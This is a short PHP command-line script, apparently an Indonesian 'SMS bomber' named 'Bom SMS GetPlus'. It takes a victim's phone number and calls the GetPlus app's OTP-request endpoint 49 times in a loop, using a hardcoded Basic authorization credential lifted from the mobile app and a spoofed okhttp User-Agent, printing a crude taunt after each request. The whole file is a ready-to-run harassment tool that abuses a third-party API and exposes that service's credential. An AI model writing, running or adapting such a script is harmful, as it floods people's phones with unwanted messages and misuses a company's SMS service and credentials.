<?php
function fn_curl($i, $var_no)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://mygetplus.azurewebsites.net:443/sms/v1/201812/carrier/requestotp/".$var_no."");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");

    $headers   = array();
    $headers[] = "Accept: application/json";
    $headers[] = "Authorization: Basic NjAyMDI3RkI1NjFFMDgxMDVBMjNGMDk4QjQ0ODhEMEI5N0FENTMyNjVFMUJGNTg1MjJENzlBNTM1QTRGRjcxNTo4RkRBMkI0QTJFNDY3NUY3Mzc5RkUzM0NBQTIyREE4QjA4OTJFOEVGRkUyRjA5RjgyNjhFMjA4Q0E1ODE4RkE4";
    $headers[] = "User-Agent: okhttp/3.11.0";
    $headers[] = "Host: mygetplus.azurewebsites.net";

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    return $result;
}

print "Bom SMS GetPlus\n";
print "Thanks To : Muhammad Ikhsan Aprilyadi\n\n";

echo "Nomor Target : ";
$var_no = trim(fgets(STDIN));

for ($i = 1; $i < 50; $i++) {
    $json_res = json_decode(fn_curl($i,$var_no));
    $json_wtf = $json_res->_10;

    echo "Masuk ga njing $json_wtf \n";
}
?>